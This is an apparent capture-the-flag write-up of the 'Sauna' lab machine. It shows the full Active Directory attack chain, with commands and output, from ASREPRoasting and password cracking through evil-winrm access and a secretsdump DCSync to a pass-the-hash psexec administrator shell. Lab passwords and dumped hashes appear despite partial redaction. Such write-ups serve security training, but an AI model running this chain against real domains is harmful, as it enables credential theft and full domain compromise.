@@ -1,0 +1,344 @@
+#+TITLE: Sauna HTB Writeups
+#+AUTHOR: Readacted
+
+
+* Enumeration
+we start the job by trying to figure out if the host is active.
+#+begin_src bash
+nmap -sn 10.10.10.175 -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 16:38 EST
+Nmap scan report for EGOTISTICAL-BANK (10.10.10.175)
+Host is up.
+Nmap done: 1 IP address (1 host up) scanned in 0.00 seconds
+#+end_src
+
+We continue by enumerating the exposed tcp services.
+#+begin_src bash
+nmap -sC -sV 10.10.10.175 -Pn
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-03 15:21 EST
+Nmap scan report for 10.10.10.175
+Host is up (0.048s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Egotistical Bank :: Home
+|_http-server-header: Microsoft-IIS/10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-04 03:22:04Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m58s
+| smb2-time: 
+|   date: 2024-03-04T03:22:11
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 64.17 seconds
+#+end_src
+* Footprinting
+Navigating to the website in a browser reveals a website for a bank. The Wappalyzer add-on doesn't identify any vulnerable technologies.
+[[./pics/homepage.png]]
+
+We use feroxbuster to perform a folder enumeration, nothing interesting.
+#+begin_src bash 
+feroxbuster -u http://10.10.10.175/ -x "php,js,bak,md,json" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.175/
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, js, bak, md, json]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        2l       10w      150c http://10.10.10.175/images => http://10.10.10.175/images/
+200      GET      385l     1324w    14226c http://10.10.10.175/css/slider.css
+200      GET      470l     1279w    24695c http://10.10.10.175/blog.html
+200      GET      122l      750w    60163c http://10.10.10.175/images/t4.jpg
+200      GET      325l      770w    15634c http://10.10.10.175/contact.html
+200      GET     2168l     4106w    37019c http://10.10.10.175/css/style.css
+200      GET      111l      661w    50106c http://10.10.10.175/images/t1.jpg
+200      GET      683l     1813w    32797c http://10.10.10.175/index.html
+200      GET      640l     1767w    30954c http://10.10.10.175/about.html
+200      GET      684l     1814w    38059c http://10.10.10.175/single.html
+200      GET     2337l     3940w    37414c http://10.10.10.175/css/font-awesome.css
+200      GET      144l      850w    71769c http://10.10.10.175/images/t2.jpg
+200      GET      138l      940w    76395c http://10.10.10.175/images/t3.jpg
+200      GET      268l     2037w   191775c http://10.10.10.175/images/skill2.jpg
+200      GET      657l     3746w   345763c http://10.10.10.175/images/skill1.jpg
+200      GET     8975l    17530w   178152c http://10.10.10.175/css/bootstrap.css
+403      GET       29l       92w     1233c http://10.10.10.175/css/
+200      GET      389l     1987w   159728c http://10.10.10.175/images/ab.jpg
+200      GET      683l     1813w    32797c http://10.10.10.175/
+301      GET        2l       10w      147c http://10.10.10.175/css => http://10.10.10.175/css/
+#+end_src
+
+On navigating to ~about.html~ and scrolling down, we see a section containing full names of some Bank employees.
+
+[[./pics/user.png]]
+
+We save everything to a file
+#+begin_src text
+Fergus Smith
+Shaun Coins
+Sophie Driver
+Bowie Taylor
+Hugo Bear
+Steven Kerb
+#+end_src
+* Foothold
+We use the list first created to create a logical permutation of users to try to guess the syntax used by the administration to manage users (name.surname, n.surname, etc.).
+#+begin_src bash
+./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
+#+end_src
+
+We will get this list.
+#+begin_src bash
+fergus
+fergus.smith
+ferguss
+fsmith
+shaun
+shaun.coins
+shaunc
+scoins
+sophie
+sophie.driver
+sophied
+sdriver
+bowie
+bowie.taylor
+bowiet
+btaylor
+hugo
+hugo.bear
+hugob
+hbear
+steven
+steven.kerb
+stevenk
+skerb
+#+end_src
+
+With our list of names we will first go to check if among all users there is one with kerberos pre-authentication disabled. Kerberos pre-authentication is a security feature that protects against password-guessing attacks.
+When pre-authentication is not enforced, one could directly send a dummy request for authentication. The Key Distribution Center (KDC) of the Domain Controller will check the authentication service request (AS-REQ), verify the user information and
+return an encrypted Ticket Granting Ticket (TGT). The TGT contains material (the timestamp) that is encrypted with the NTLM hash of the corresponding account. A hash can be derived from this, that can be subjected to an offline brute force attack in order to reveal the plaintext password.
+Using Impacket's GetNPUser, we can attempt an ASREPRoasting attack in order to extract a hash from user accounts that do not require pre-authentication.
+#+begin_src bash
+while read user; do GetNPUsers.py egotistical-bank.local/"$user" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt
+#+end_src
+
+#+begin_src text
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:<redacted>
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+#+end_src
+~GetNPUsers.py~ returns a hash for user fsmith .
+
+Now we are left to save the hash.
+#+begin_src bash
+echo -n '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:<redacted>' > tgt.hash
+#+end_src
+
+And now try to get the password with john.
+#+begin_src bash
+john tgt.hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Thes<redacted>     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
+1g 0:00:00:03 DONE (2024-03-03 15:39) 0.3105g/s 3272Kp/s 3272Kc/s 3272KC/s Thrall..Thehunter22
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+#+end_src
+
+* Initial Access
+With the gained credentials fsmith / Thestrokes23 we can try to login using WinRM (port
+5985). Windows Remote Management (WinRM), is a Windows-native built-in remote management
+protocol and it is often enabled for users that need to manage systems remotely. We can use evilwinrm to connect to the remote system.
+#+begin_src bash
+evil-winrm -i 10.10.10.175 -u fsmith -p 'Thes<redacted>'
+#+end_src
+
+* Privilege Escalation
+Having gained a foothold on the machine, we can use a script such as WinPEAS to automate
+enumeration tasks. Use the upload command from our current WinRM session to transfer the
+binary to the remote server, and then run it.
+
+#+begin_src bash
+*Evil-WinRM* PS C:\Users\FSmith\Documents> WinPeasex64.exe
+#+end_src
+
+The script reveals that the user ~EGOTISTICALBANK\svc_loanmanager~ has been set to automatically log in, and this account has the password releved by the scripts.
+#+begin_src bash
+����������͹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  <redacted>
+
+����������͹ Password Policies
+#+end_src
+
+The command net user ~svc_loanmgr~ reveals that this user is also part of the ~Remote Management Users group~. Use evil-winrm again to login as this new user.
+#+begin_src bash
+evil-winrm -i 10.10.10.175 -u svc_loanmgr -p '<redactede>'
+#+end_src
+
+Possiamo usare Bloodhound per enumerare e visualizzare il dominio Active Directory e identificare le possibili catene di attacco che ci permetteranno di elevare i nostri privilegi di dominio.
+First we go to download and set up the environment.
+#+begin_src bash
+curl -o docker-compose.yml https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml && sudo docker-compose -f docker-compose.yml up
+#+end_src
+
+We can now visit in the bloodhound browser ~http://127.0.0.1:8080~, we go up _settinggs -> Download Collectors_ and download the collector ~Sharphound~.
+Once a downloaded, through always evil-winrm we go to upload it to the target machine.
+#+begin_src bash
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./SharpHound.exe
+2024-03-03T20:44:55.1098536-08:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
+2024-03-03T20:44:55.2502878-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
+2024-03-03T20:44:55.2658560-08:00|INFORMATION|Initializing SharpHound at 8:44 PM on 3/3/2024
+2024-03-03T20:44:55.4377247-08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for EGOTISTICAL-BANK.LOCAL : SAUNA.EGOTISTICAL-BANK.LOCAL
+2024-03-03T20:45:19.5783301-08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices
+2024-03-03T20:45:19.7660621-08:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL
+2024-03-03T20:45:19.7660621-08:00|INFORMATION|Testing ldap connection to EGOTISTICAL-BANK.LOCAL
+2024-03-03T20:45:19.8283323-08:00|INFORMATION|Beginning LDAP search for EGOTISTICAL-BANK.LOCAL Configuration NC
+#+end_src
+
+Thanks again to evil-winrm let's go get the zipper containing all the json that bloodhound wants.
+#+begin_src bash
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> dir
+
+
+    Directory: C:\Users\svc_loanmgr\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2024   8:46 PM          22308 20240303204602_BloodHound.zip
+-a----         3/3/2024   8:44 PM        1343488 SharpHound.exe
+-a----         3/3/2024   8:46 PM          45175 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin
+#+end_src
+
+When taken all we have to do is go back to the bloodhound homepage, _settings -> administartor -> upload file_ and upload them.
+After a while searching the path from our current user ~svc_loanmgr~ to the admin group we will see something interesting.
+[[./pics/blood.png]]
+
+This account has access to ~GetChanges~ and ~GetChangesAll~ on the domain. Googling that will quickly point to a low of articles on the DCSync attack, or I can right click on the label (you have to get in just the right spot) and get the menu for it:
+
+[[./pics/click.png]]
+
+Clicking help, there’s a Abuse Info tab that includes instructions for how to abuse this privilege:
+
+[[./pics/abuse.png]]
+
+My preferred way to do a ~DCSync attack~ is using secretsdump.py, which allows me to run DCSync attack from my Kali box, provided I can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.
+I need to give it just a target string in the format [username]:[password]@[ip]:
+#+begin_src bash
+secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:<redacted>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:<redacted>
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:<redacted>
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:<redacted>
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:87347c253a9f1268f2475984cc1605ef:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:dce1896599ad36d0a9fcf2a3cd2069ca86046b930c06c22e2876d375097833c2
+SAUNA$:aes128-cts-hmac-sha1-96:7dec3554d489a32299317d703423c428
+SAUNA$:des-cbc-md5:290d5dce1ccd2615
+[*] Cleaning up... 
+#+end_src
+** Shells
+I can use the administrator hash to WMI to get a shell as administrator:
+#+begin_src bash
+psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes <redacted>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
+
+
+[*] Requesting shares on 10.10.10.175.....
+[*] Found writable share ADMIN$
+[*] Uploading file EZsXIuec.exe
+[*] Opening SVCManager on 10.10.10.175.....
+[*] Creating service WxJi on 10.10.10.175.....
+[*] Starting service WxJi.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.973]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+C:\Windows\system32>whoami 
+#+end_src
